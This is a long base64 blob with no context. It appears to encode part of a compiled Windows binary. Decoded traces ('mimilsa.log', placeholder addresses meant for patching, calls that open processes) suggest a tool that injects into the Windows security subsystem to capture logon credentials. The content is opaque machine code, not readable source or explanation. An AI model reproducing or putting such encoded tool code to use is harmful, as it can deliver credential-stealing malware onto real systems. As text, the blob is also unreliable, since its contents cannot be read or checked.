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
